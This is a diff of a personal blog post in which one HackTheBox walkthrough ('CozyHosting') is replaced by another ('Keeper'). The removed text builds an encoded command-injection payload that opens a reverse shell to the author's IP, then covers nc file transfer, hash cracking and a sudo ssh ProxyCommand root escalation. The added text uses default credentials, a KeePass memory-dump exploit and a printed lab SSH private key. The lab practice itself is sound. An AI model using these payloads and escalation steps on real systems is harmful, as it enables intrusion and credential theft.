@@ -6,276 +6,172 @@ category: cyber
 
 ## Comments
 
-This is the first machine I attempted after finishing the Starting Point machines.
+This was an easy box and I didn't have to refer to any walkthrough to solve it. Being able to solve it completely on my own after struggling so much with the much harder Cozyhosting box was pretty fulfilling.
 
-Unlike Starting Point machines, these have no guidance. I ended up referring to a walkthrough because I didn't know what to search for. But I hope to do future ones without any walkthrough unless I am really really stuck for hours.
-
-This machine tested Command Line injection via HTTP which I had not encountered before, but the idea of Remote Code Execution via some form of XSS/HTTP/SQL injection is familiar.
-
-Even with the walkthrough, I got tripped up by the formatting of commands as I was using different software (Burpsuite) which already does its own encoding.
-
-Also, I learned to be wary the different encoding of non-alphanumeric characters as a string passes through URL, HTTP, UNIX, and so on.
 
 ## Walkthrough
 
+Target IP: 
+
+    10.10.11.227
+
 ### Enumeration
 
-Target `10.10.11.230`
+First do an nmap scan which shows the following ports:
 
-My IP `10.10.14.33`
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    nginx 1.18.0 (Ubuntu)
+    |_http-favicon: Unknown favicon MD5: CF60F068F7A5343704B608CCE387F31F
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: nginx/1.18.0 (Ubuntu)
+    |_http-title: Login
+    |_http-trane-info: Problem with XML parsing of /evox/about
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Check target IP using web browser reveals `cozyhosting.htb` domain.
+Pretty default ports. Take note of the open `ssh` port which might be useful later on if we get ssh credentials.
 
-Add `10.10.11.230` to `/etc/hosts`
+Visit target IP on browser points to `tickets.keeper.htb/rt/`
 
-Check for open ports
+Add `tickets.keeper.htb` to our `/etc/hosts` file
 
-    nmap -sC -sV -v 10.10.11.230
+The website is using RequestTracker v4.4.4+dfsg-2ubuntu1 and is requesting for a login.
 
-    >> PORT   STATE SERVICE REASON  VERSION
-        22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-        80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
-        |_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
-        | http-methods: 
-        |_  Supported Methods: GET HEAD OPTIONS
-        |_http-server-header: nginx/1.18.0 (Ubuntu)
-        |_http-title: Cozy Hosting - Home
-        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+RequestTracker (RT) is a free software for tracking IT tickets.
 
-ssh service suggest a way to interact with the target once we get credentials
+Maybe we can try to find some common login credentials? 
 
-Brute-force directory...
-
-    dirb http://cozyhosting.htb/ /usr/share/dirb/wordlists/small.txt -r
-
-    >>  + http://cozyhosting.htb/admin (CODE:401|SIZE:97)    
-        + http://cozyhosting.htb/error (CODE:500|SIZE:73)    
-        + http://cozyhosting.htb/index (CODE:200|SIZE:12706) 
-        + http://cozyhosting.htb/login (CODE:200|SIZE:4431)  
-        + http://cozyhosting.htb/logout (CODE:204|SIZE:0)
-
-Check out the `admin` page but it redirects us back to login
-
-Check out the `error` page and it shows
-
-> Whitelabel Error Page
-
-Google tells us that Whitelabel comes from Springboot-based applications so we further Google for Springboot endpoints.
-
-From [Springboot](https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/production-ready-endpoints.html#:~:text=Spring%20Boot%20includes%20a%20number,exists%20in%20the%20application%20context.):
-
-> Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the health endpoint provides basic application health information.  Each individual endpoint can be enabled or disabled. This controls whether or not the endpoint is created and its bean exists in the application context. <br><br> To be remotely accessible an endpoint also has to be exposed via JMX or HTTP. Most applications choose HTTP, where the ID of the endpoint along with a prefix of /actuator is mapped to a URL. For example, by default, the health endpoint is mapped to /actuator/health.
-
-Checking `http://cozyhosting.htb/actuators` shows many endpoints. 
-
-In particular:
-
-    /actuators/sessions 
-    /actuators/mapping
+Let's try the default login `root:password` provided by Google. It works!
 
 ### Foothold
 
-The `sessions` endpoint gives us the SESSID for a user `kanderson`.
+Exploring the admin dashboard of the RT website, we can find interesting info under
 
-    1CAE2623ACDC287A6F56C977E6C9D94F: kanderson
+    Admin > Tools > System Config
 
-By passing this SESSID cookie to our browser and then sending a request to the `/admin` URL, we are able to access the admin panel.
+The database information might come in handy later. Let's keep it.
 
-At the bottom of the admin panel we see another entry point! A system user can SSH into the machine if they have the right credentials.
+Another find is under `Users > Select` which shows the existing user accounts and additional info.
 
-Let's see if this SSH field is vulnerable to injection...
+We are logged in as `root` which has SuperUser access. The other account `lnorgaard` somehow has its password stored in plaintext in the comments field.
 
-Enter `kanderson` as username and `'` single quote as host name.
+Since `ssh` is open, let's try `ssh root@...` with the default password. Doesn't work, at least they changed it.
 
-The URL returns
-
-    http://cozyhosting.htb/admin?error=usage:%20
-
-If we try with `;` semicolon instead, the message returned is the usual error when ssh is not used properly in the terminal.
-
-    ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]
-
-This suggests that the server is taking in hostname and user name without sanitizing it, and passing it straight into an ssh command via command line. 
-
-This means we can try to sneak in a reverse shell by terminating the ssh command and running our reverse shell.
-
-### Remote Code Execution
-
-Since the machine is likely running `ssh [username]@[hostname]`
-
-We pass a username that causes the command to become `ssh ;[reverse_shell_cmd];#@[hostname]`
-
-The first `ssh ;` will not do anything since no params are passed, moving us to the next command which is the reverse shell. Afterwhich the `#[hostname]` will be treated as a comment.
-
-Hence our payload is `;[reverse_shell_cmd];#`
-
-The standard reverse shell command is:
-
-    bash -i >&/dev/tcp/10.10.14.33/1234 0>&1
-
-Which we need to base64 encode so that it can be passed through HTTP
-
-    echo "bash -i >&/dev/tcp/10.10.14.33/1234 0>&1" | base64
-
-    >> YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo=
-
-Now, we need a command that the machine will execute in CLI (after it tries to ssh) to decode the base64 and then execute the reverse shell command in its own bash terminal.
-
-    echo "YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64 -d|bash
-
-Hence, our payload is 
-
-    ;echo "YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64 -d|bash;#
-
-One last step - since whitespaces get converted into `%20` when URL-encoded which causes the command to be interpreted wrongly by the terminal. We need to convert whitespaces into something that can be sent without being encoded, and also interpretable by the terminal.
-
-We can use the  UNIX Internal Field Separator `${IFS}` which is a whitespace by default.
-
-    ;echo${IFS}"YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64${IFS}-d|bash;#
-
-Finally, URL-encode the entire payload to be sent.
-(I was having an issue with this because I didn't URL encode, and the `+` was being encoded into a whitespace when it reached the terminal).
-
-    %3becho${IFS}"YmFzaCAtaSA%2bJi9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo%3d"|base64${IFS}-d|bash%3b%23
-
-Open up a listener on port 1234
-
-    nc -l -v -p 1234
-
-Then send the request containing the payload in the username field (I used Burpsuite Repeater for this).
-
-Reverse Shell obtained!
-
-## Lateral movement
-
-We find a file named `cloudhosting-0.0.1.jar` which contains the entire contents of the server. See [here](https://docs.spring.io/spring-boot/docs/current/reference/html/executable-jar.html) for more details.
-
-Download the file to our local machine using a nc transfer
-
-    TARGET
-    nc [our ip address] 7777 < cloudhosting-0.0.1.jar
-    
-    LOCAL
-    nc -l -p 7777 > cloudhosting-0.0.1.jar
-
-.jar files can be opened with the jd-gui program.
-
-Inside, we can find a segment that has details about the server database:
-
-    server.address=127.0.0.1
-    server.servlet.session.timeout=5m
-    management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
-    management.endpoint.sessions.enabled = true
-    spring.datasource.driver-class-name=org.postgresql.Driver
-    spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
-    spring.jpa.hibernate.ddl-auto=none
-    spring.jpa.database=POSTGRESQL
-    spring.datasource.platform=postgres
-    spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
-    spring.datasource.username=postgres
-    spring.datasource.password=Vg&nvzAQ7XxR
-
-Back in the reverse shell, we can access the PostgreSQL database directly using the `postgres` username with the provided password.
-
-    psql -U postgres -h 127.0.0.1
-
-Explore the database and find the user credentials table
-
-    >> \l
-                                    List of databases
-        Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-    -------------+----------+----------+-------------+-------------+-----------------------
-    cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
-    postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
-    template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
-                |          |          |             |             | postgres=CTc/postgres
-    template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
-                |          |          |             |             | postgres=CTc/postgres
-    (4 rows)
-
-    >> \c cozyhosting
-
-
-    You are now connected to database "cozyhosting" as user "postgres".
-
-    >> \d
-                List of relations
-    Schema |     Name     |   Type   |  Owner   
-    --------+--------------+----------+----------
-    public | hosts        | table    | postgres
-    public | hosts_id_seq | sequence | postgres
-    public | users        | table    | postgres
-    (3 rows)
-
-    >> select * from users;
-
-    name    |                           password                           | role  
-    -----------+--------------------------------------------------------------+-------
-    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
-    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
-
-These look like password hashes.
-
-Quick google and we find that the hash is of either formats:
-- Blowfish(OpenBSD)
-- Woltlab Burning Board 4.x
-- bcrypt
-
-Copy the `admin` hash to a file and use John the Ripper to crack it.
-
-    john admin_hash.txt --wordlist='~/Downloads/SecLists/Passwords/Leaked-Databases/rockyou-75.txt'
-    john show
-
-    >> manchesterunited
-
-Still in reverse shell, we can check `/home` for other users and find `josh`.
-
-So `josh` is the admin... We'll `su josh` using the cracked password.
-
-We have found the `user.txt`
-
-    fee6e0563d22974e573c2cbf575f6f84
+Now let's try `ssh lnorgaard@...` with `Welcome2023!`... looks like Lisa didn't change her default password. We get the user.txt = ef14585dce7035b1e1af3048d012c60b
 
 ### Privilege Escalation
 
-Check what commands `josh` can run as root
+Next, we check if `lnorgaard` has any sudo privileges.
 
     sudo -l
+    > Sorry, user lnorgaard may not run sudo on keeper.
 
-    >> User josh may run the following commands on localhost:
-    (root) /usr/bin/ssh *
+Looking around the user files, we can find some suspicious information:
 
-Since `ssh` can be run as root, we can use `josh` to start an SSH to our local machine as `root` but interrupt it and slip in a shell which will be executed as `root` that we can then use to explore the `root` dir.
+    KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
 
-Refer to this [collection of binary escapes](https://gtfobins.github.io/gtfobins/ssh/) for more details.
+`RT30000.zip` is just the compressed version of the first 2 files. The `.zip` is 80MB while the other files are 300MB. 
 
-    sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' 10.10.14.33
+`.kdbx` stands for KeePassDatabaseExtension, which is a file-store database that holds encrypted KeePass passwords.
 
-I needed a breakdown of the command to fully understand how it worked:
+### Exploit
 
-    sudo --> uses the root privilege (which we will exploit)
-    -o ProxyCommand= --> the proxy command will be run before ssh attempts to connect to the provided host
-    ; --> terminates the previous command (i.e. terminate the ssh)
-    sh --> start a shell
-    0<&2 --> redirect inputs (0) to stderr (i.e. display inputs in console log)
-    1>&2 redirect outputs (1) to the stderr (i.e display outputs in console log)
+KeePass databases are meant to be opened with the KeePass program or with `kpcli` in the CLI. KeePass encrypts all the passwords stored inside it using a master key password. So we need a way to get this master key if we are to read the passwords.
 
-    ** note that <& is for redirecting inputs and >& is for redirecting outputs, the arrow direction doesnt actually mean anything..
+Luckily, there seems to be a memory dump of the entire KeePass program either while it was running or setup (and crashed).
 
-Essentially, we use ProxyCommand to hijack the root privilege that ssh has to start a shell as root.
+There is already an [exploit](https://github.com/vdohney/keepass-password-dumper) for KeePass memdumps.
+According to the above PoC, there is a vulnerability in KeePass where the master key plaintext is exposed during the setup and can be extracted in the memdump. This tool extracts the master key from a memdump file.
 
-Inside `root` we can find `root.txt`
+Since the tool is built in .NET, we have to use a Windows machine to run it.
 
-    4cb1287a9a46e01e6bdd318232018329
+First, we'll download the `RT30000.zip` locally. I chose to use `netcat` to transfer the file over. 
 
+    LOCAL
 
-And we're done! This was a really long one because there were multiple steps to move laterally and finally get privilege escalation. 
+    nc -lvnp 1234 > RT30000.zip
 
-Some things that I want to explore more from this:
-- Command Line injection (should go read up more on this)
-- Exploiting and escaping binaries that can be run as root
-- Hash cracking
-- All the various ways to get reverse shells and root shells
+    TARGET
+    nc -p 1234 < RT30000.zip
+
+Next, I am running a VM inside my Windows machine so I transfer `RT30000.zip` over via SCP by running `pscp` on Windows.
+
+    pscp user@<VM_eth0_IP>:[VM_source_path] [Windows_dest_path]
+
+Side note for this to work:
+- VM network must be set up to use Bridged Adapter mode.
+- You should use the IP address of the `eth0` adapter and not the `tun0` VPN IP
+- Make sure OpenSSH is installed in the VM and `ufw` is allowing `ssh` (use `sudo ufw enable | ufw allow ssh`)
+
+Remember to unzip the file after so you have `KeePassDumpFull.dmp` in the directory.
+
+Run the .NET program on Windows:
+
+    cd keepass-password-dumper
+    dotnet run [PATH_TO_DUMP]
+
+The master key is pretty clear, except for the first 2 characters (expected):
+
+    __dgrød med fløde
+
+We could brute force it but a Google search of `dgrød med fløde` returns `rødgrød med fløde` which is Danish red berry pudding. Makes sense since our user has a Scandinavian name. 
+
+With this master key, we go back to our local machine and run `kpcli` on the `.kdbx` with the key. Note that `kpcli` needs to be installed first.
+
+KeePass stores data in directory format. After some exploration, I found the entry for the RT server:
+
+    Title: keeper.htb (Ticketing Server)
+    Uname: root
+    Pass: F4><3K0nd!
+    URL: 
+    Notes: PuTTY-User-Key-File-3: ssh-rsa
+        Encryption: none
+        Comment: rsa-key-20230519
+        Public-Lines: 6
+        AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
+        8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
+        EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
+        Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
+        FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
+        LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
+        Private-Lines: 14
+        AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
+        oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
+        kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
+        f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
+        VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
+        UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
+        OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
+        in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
+        SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
+        09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
+        xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
+        AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
+        AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
+        NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
+        Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
+
+We have a plaintext password `F4><3K0nd!` for `root`. Note: Faxe Kondi is a Danish soft drink.
+
+However, these credentials still don't allow us to `ssh` as `root`. Maybe the password was changed...
+
+We have an easier way in. In the notes section, there is a plaintext Putty ssh key!
+
+Since Putty is only for Windows, we have to convert the Putty key into an OpenSSH key which we can use directly in Linux.
+
+To do this:
+1. Copy over the entire text inside Notes
+2. Save the text file as `.ppk`
+3. Convert `.ppk` into `.pem`. Install `puttygen` first.
+
+        puttygen root.ppk -O private-openssh -o root.pem
+
+4. `ssh` with `.pem`
+
+        ssh -i root.pem root@10.10.11.227
+
+Once in root, the root.txt = 9178ec92153cd5bd22bb4ebf5425229c
 
 
 *That's all for tonight, ciao.*
